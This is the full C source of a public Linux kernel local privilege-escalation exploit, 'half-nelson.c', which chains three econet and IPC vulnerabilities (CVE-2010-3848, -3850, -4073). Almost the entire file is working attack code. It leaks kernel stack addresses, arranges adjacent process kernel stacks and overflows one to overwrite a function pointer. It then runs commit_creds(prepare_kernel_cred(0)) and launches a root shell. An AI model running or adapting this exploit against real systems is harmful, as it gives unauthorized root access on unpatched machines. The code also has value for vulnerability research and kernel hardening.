/*
 * half-nelson.c
 *
 * Linux Kernel < 2.6.36.2 Econet Privilege Escalation Exploit
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3848
 *
 *   Stack-based buffer overflow in the econet_sendmsg function in
 *   net/econet/af_econet.c in the Linux kernel before 2.6.36.2, when an
 *   econet address is configured, allows local users to gain privileges by
 *   providing a large number of iovec structures.
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3850
 *
 *   The ec_dev_ioctl function in net/econet/af_econet.c in the Linux kernel
 *   before 2.6.36.2 does not require the CAP_NET_ADMIN capability, which
 *   allows local users to bypass intended access restrictions and configure
 *   econet addresses via an SIOCSIFADDR ioctl call.
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4073
 *
 *   The ipc subsystem in the Linux kernel before 2.6.37-rc1 does not
 *   initialize certain structures, which allows local users to obtain
 *   potentially sensitive information from kernel stack memory.
 *
 * Usage:
 *
 *   $ gcc half-nelson.c -o half-nelson -lrt
 *   $ ./half-nelson
 *   [+] looking for symbols...
 *   [+] resolved symbol commit_creds to 0xffffffff81088ad0
 *   [+] resolved symbol prepare_kernel_cred to 0xffffffff81088eb0
 *   [+] resolved symbol ia32_sysret to 0xffffffff81046692
 *   [+] spawning children to achieve adjacent kstacks...
 *   [+] found parent kstack at 0xffff88001c6ca000
 *   [+] found adjacent children kstacks at 0xffff88000d10a000 and 0xffff88000d10c000
 *   [+] lower child spawning a helper...
 *   [+] lower child calling compat_sys_wait4 on helper...
 *   [+] helper going to sleep...
 *   [+] upper child triggering stack overflow...
 *   [+] helper woke up
 *   [+] lower child returned from compat_sys_wait4
 *   [+] parent's restart_block has been clobbered
 *   [+] escalating privileges...
 *   [+] launching root shell!
 *   # id
 *   uid=0(root) gid=0(root)
 *
 * Notes:
 *
 *   This exploit leverages three vulnerabilities to escalate privileges.
 *   The primary vulnerability is a kernel stack overflow, not a stack buffer
 *   overflow as the CVE description incorrectly states. I believe this is the
 *   first public exploit for a kernel stack overflow, and it turns out to be
 *   a bit tricky due to some particulars of the econet vulnerability. A full
 *   breakdown of the exploit is forthcoming.
 *
 *   Tested on Ubuntu 10.04 LTS (2.6.32-21-generic).
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <syscall.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <net/if.h>

#define IOVS           446
#define NPROC          1024
#define KSTACK_SIZE    8192

#define KSTACK_UNINIT  0
#define KSTACK_UPPER   1
#define KSTACK_LOWER   2
#define KSTACK_DIE     3
#define KSTACK_PARENT  4
#define KSTACK_CLOBBER 5

#define LEAK_BASE      0xffff880000000000
#define LEAK_TOP       0xffff8800c0000000
#define LEAK_DEPTH     500
#define LEAK_OFFSET    32

#define NR_IPC         0x75
#define NR_WAIT4       0x72
#define SEMCTL         0x3

#ifndef PF_ECONET
#define PF_ECONET      19
#endif

#define STACK_OFFSET   6
#define RESTART_OFFSET 40

struct ec_addr {
	unsigned char station;
	unsigned char net;
};

struct sockaddr_ec {
	unsigned short sec_family;
	unsigned char port;
	unsigned char cb;
	unsigned char type;
	struct ec_addr addr;
	unsigned long cookie;
};

struct ipc64_perm {
	uint32_t key;
	uint32_t uid;
	uint32_t gid;
	uint32_t cuid;
	uint32_t cgid;
	uint32_t mode;
	uint16_t seq;
	uint16_t __pad2;
	unsigned long __unused1;
	unsigned long __unused2;
};

struct semid64_ds {
	struct ipc64_perm sem_perm;
	unsigned long sem_otime;
	unsigned long __unused1;
	unsigned long sem_ctime;
	unsigned long __unused;
	unsigned long sem_nsems;
	unsigned long __unused3;
	unsigned long __unused4;
};

union semun {
	int val;
	struct semid_ds *buf;
	unsigned short *array;
	struct seminfo *__buf;
};

struct region {
	unsigned long parent;
	unsigned long addrs[NPROC];
};
struct region *region;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long ia32_sysret;

void __attribute__((regparm(3)))
kernel_code(void)
{
	commit_creds(prepare_kernel_cred(0));
}

void
payload_parent(void)
{
	asm volatile (
		"mov $kernel_code, %rax\n"
		"call *%rax\n"
	);
}

void
payload_child(void)
{
	asm volatile (
		"movq $payload_parent, (%0)\n"
		"jmpq *%1\n"
		:
		: "r"(region->parent + RESTART_OFFSET), "r"(ia32_sysret)
	);
}

unsigned long
get_kstack(void)
{
	int i, size, offset;
	union semun *arg;
	struct semid_ds dummy;
	struct semid64_ds *leaked;
	char *stack_start, *stack_end;
	unsigned char *p;
	unsigned long kstack, *ptr;

	/* make sure our argument is 32-bit accessible */
	arg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_32BIT, -1, 0);
	if (arg == MAP_FAILED) {
		printf("[-] failure mapping memory, aborting!\n");
		exit(1);
	}

	/* map a fake stack to use during syscall */
	stack_start = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_32BIT, -1, 0);
	if (stack_start == MAP_FAILED) {
		printf("[-] failure mapping memory, aborting!\n");
		exit(1);
	}
	stack_end = stack_start + 4096;

	memset(arg, 0, sizeof(union semun));
	memset(&dummy, 0, sizeof(struct semid_ds));
	arg->buf = &dummy;

	/* syscall(NR_IPC, SEMCTL, 0, 0, IPC_SET, arg) */
	asm volatile (
		"push %%rax\n"
		"push %%rbx\n"
		"push %%rcx\n"
		"push %%rdx\n"
		"push %%rsi\n"
		"push %%rdi\n"
		"movl %0, %%eax\n"
		"movl %1, %%ebx\n"
		"movl %2, %%ecx\n"
		"movl %3, %%edx\n"
		"movl %4, %%esi\n"
		"movq %5, %%rdi\n"
		"movq %%rsp, %%r8\n"
		"movq %6, %%rsp\n"
		"push %%r8\n"
		"int $0x80\n"
		"pop %%r8\n"
		"movq %%r8, %%rsp\n"
		"pop %%rdi\n"
		"pop %%rsi\n"
		"pop %%rdx\n"
		"pop %%rcx\n"
		"pop %%rbx\n"
		"pop %%rax\n"
		:
		: "r"(NR_IPC), "r"(SEMCTL), "r"(0), "r"(0), "r"(IPC_SET), "r"(arg), "r"(stack_end)
		: "memory", "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8"
	);

	/* naively extract a pointer to the kstack from the kstack */
	p = stack_end - (sizeof(unsigned long) + sizeof(struct semid64_ds)) + LEAK_OFFSET;
	kstack = *(unsigned long *) p;

	if (kstack < LEAK_BASE || kstack > LEAK_TOP) {
		printf("[-] failed to leak a suitable kstack address, try again!\n");
		exit(1);
	}
	if ((kstack % 0x1000) < (0x1000 - LEAK_DEPTH)) {
		printf("[-] failed to leak a suitable kstack address, try again!\n");
		exit(1);
	}

	kstack = kstack & ~0x1fff;

	return kstack;
}

unsigned long
get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f) {
		return 0;
	}

	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);

	return 0;
}

int
get_adjacent_kstacks(void)
{
	int i, ret, shm, pid, type;

	/* create shared communication channel between parent and its children */
	shm = shm_open("/halfnelson", O_RDWR | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
	if (shm < 0) {
		printf("[-] failed creating shared memory, aborting!\n");
		exit(1);
	}

	ret = ftruncate(shm, sizeof(struct region));
	if (ret != 0) {
		printf("[-] failed resizing shared memory, aborting!\n");
		exit(1);
	}

	region = mmap(NULL, sizeof(struct region), PROT_READ | PROT_WRITE, MAP_SHARED, shm, 0);
	memset(region, KSTACK_UNINIT, sizeof(struct region));

	/* parent kstack self-discovery */
	region->parent = get_kstack();

	printf("[+] found parent kstack at 0x%lx\n", region->parent);

	/* fork and discover children with adjacently-allocated kernel stacks */
	for (i = 0; i < NPROC; ++i) {
		pid = fork();

		if (pid > 0) {
			type = KSTACK_PARENT;
			continue;
		} else if (pid == 0) {
			/* children do kstack self-discovery */
			region->addrs[i] = get_kstack();

			/* children sleep until parent has found adjacent children */
			while (1) {
				sleep(1);
				if (region->addrs[i] == KSTACK_DIE) {
					/* parent doesn't need us :-( */
					exit(0);
				} else if (region->addrs[i] == KSTACK_UPPER) {
					/* we're the upper adjacent process */
					type = KSTACK_UPPER;
					break;
				} else if (region->addrs[i] == KSTACK_LOWER) {
					/* we're the lower adjacent process */
					type = KSTACK_LOWER;
					break;
				}
			}
			break;
		} else {
			printf("[-] fork failed, aborting!\n");
			exit(1);
		}
	}

	return type;
}

void
do_parent(void)
{
	int i, j, upper, lower;

	/* parent sleeps until we've discovered all the child kstacks */
	while (1) {
		sleep(1);
		for (i = 0; i < NPROC; ++i) {
			if (region->addrs[i] == KSTACK_UNINIT) {
				break;
			}
		}
		if (i == NPROC) {
			break;
		}
	}

	/* figure out if we have any adjacent child kstacks */
	for (i = 0; i < NPROC; ++i) {
		for (j = 0; j < NPROC; ++j) {
			if (region->addrs[i] == region->addrs[j] + KSTACK_SIZE) {
				break;
			}
		}
		if (j != NPROC) {
			break;
		}
	}
	if (i == NPROC && j == NPROC) {
		printf("[-] failed to find adjacent kstacks, try again!\n");
		exit(1);
	}

	upper = i;
	lower = j;

	printf("[+] found adjacent children kstacks at 0x%lx and 0x%lx\n", region->addrs[lower], region->addrs[upper]);

	/* signal to non-adjacent children to die */
	for (i = 0; i < NPROC; ++i) {
		if (i != upper && i != lower) {
			region->addrs[i] = KSTACK_DIE;
		}
	}

	/* signal adjacent children to continue on */
	region->addrs[upper] = KSTACK_UPPER;
	region->addrs[lower] = KSTACK_LOWER;

	/* parent sleeps until child has clobbered the fptr */
	while (1) {
		sleep(1);
		if (region->parent == KSTACK_CLOBBER) {
			break;
		}
	}

	printf("[+] escalating privileges...\n");

	/* trigger our clobbered fptr */
	syscall(__NR_restart_syscall);

	/* our privileges should be escalated now */
	if (getuid() != 0) {
		printf("[-] privilege escalation failed, aborting!\n");
		exit(1);
	}

	printf("[+] launching root shell!\n");

	execl("/bin/sh", "/bin/sh", NULL);
}

void
do_child_upper(void)
{
	int i, ret, eco_sock;
	struct sockaddr_ec eco_addr;
	struct msghdr eco_msg;
	struct iovec iovs[IOVS];
	struct ifreq ifr;
	char *target;

	/* calculate payload target, skip prologue */
	target = (char *) payload_child;
	target += 4;

	/* give lower child a chance to enter its wait4 call */
	sleep(1);

	/* write some zeros */
	for (i = 0; i < STACK_OFFSET; ++i) {
		iovs[i].iov_base = (void *) 0x0;
		iovs[i].iov_len = 0;
	}

	/* overwrite saved ia32_sysret address on stack */
	iovs[STACK_OFFSET].iov_base = (void *) target;
	iovs[STACK_OFFSET].iov_len = 0x0246;

	/* force abort via EFAULT */
	for (i = STACK_OFFSET + 1; i < IOVS; ++i) {
		iovs[i].iov_base = (void *) 0xffffffff00000000;
		iovs[i].iov_len = 0;
	}

	/* create econet socket */
	eco_sock = socket(PF_ECONET, SOCK_DGRAM, 0);
	if (eco_sock < 0) {
		printf("[-] failed creating econet socket, aborting!\n");
		exit(1);
	}

	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, "lo");

	/* trick econet into associated with the loopback */
	ret = ioctl(eco_sock, SIOCSIFADDR, &ifr);
	if (ret != 0) {
		printf("[-] failed setting interface address, aborting!\n");
		exit(1);
	}

	memset(&eco_addr, 0, sizeof(eco_addr));
	memset(&eco_msg, 0, sizeof(eco_msg));
	eco_msg.msg_name = &eco_addr;
	eco_msg.msg_namelen = sizeof(eco_addr);
	eco_msg.msg_flags = 0;
	eco_msg.msg_iov = &iovs[0];
	eco_msg.msg_iovlen = IOVS;

	printf("[+] upper child triggering stack overflow...\n");

	/* trigger the kstack overflow into lower child's kstack */
	ret = sendmsg(eco_sock, &eco_msg, 0);
	if (ret != -1 || errno != EFAULT) {
		printf("[-] sendmsg succeeded unexpectedly, aborting!\n");
		exit(1);
	}

	close(eco_sock);
}

void
do_child_lower(void)
{
	int pid;

	printf("[+] lower child spawning a helper...\n");

	/* fork off a helper to wait4 on */
	pid = fork();
	if (pid == 0) {
		printf("[+] helper going to sleep...\n");
		sleep(5);
		printf("[+] helper woke up\n");
		exit(1);
	}

	printf("[+] lower child calling compat_sys_wait4 on helper...\n");

	/* syscall(NR_WAIT4, pid, 0, 0, 0) */
	asm volatile (
		"push %%rax\n"
		"push %%rbx\n"
		"push %%rcx\n"
		"push %%rdx\n"
		"push %%rsi\n"
		"movl %0, %%eax\n"
		"movl %1, %%ebx\n"
		"movl %2, %%ecx\n"
		"movl %3, %%edx\n"
		"movl %4, %%esi\n"
		"int $0x80\n"
		"pop %%rsi\n"
		"pop %%rdx\n"
		"pop %%rcx\n"
		"pop %%rbx\n"
		"pop %%rax\n"
		:
		: "r"(NR_WAIT4), "r"(pid), "r"(0), "r"(0), "r"(0)
		: "memory", "rax", "rbx", "rcx", "rdx", "rsi"
	);

	printf("[+] lower child returned from compat_sys_wait4\n");

	printf("[+] parent's restart_block has been clobbered\n");

	/* signal parent that our fptr should now be clobbered */
	region->parent = KSTACK_CLOBBER;
}

int
main(int argc, char **argv)
{
	int type;

	if (sizeof(unsigned long) != 8) {
		printf("[-] x86_64 only, sorry!\n");
		exit(1);
	}

	printf("[+] looking for symbols...\n");

	commit_creds = (_commit_creds) get_symbol("commit_creds");
	if (!commit_creds) {
		printf("[-] symbol table not available, aborting!\n");
		exit(1);
	}

	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
	if (!prepare_kernel_cred) {
		printf("[-] symbol table not available, aborting!\n");
		exit(1);
	}

	ia32_sysret = get_symbol("ia32_sysret");
	if (!ia32_sysret) {
		printf("[-] symbol table not available, aborting!\n");
		exit(1);
	}

	printf("[+] spawning children to achieve adjacent kstacks...\n");

	type = get_adjacent_kstacks();

	if (type == KSTACK_PARENT) {
		do_parent();
	} else if (type == KSTACK_UPPER) {
		do_child_upper();
	} else if (type == KSTACK_LOWER) {
		do_child_lower();
	}

	return 0;
}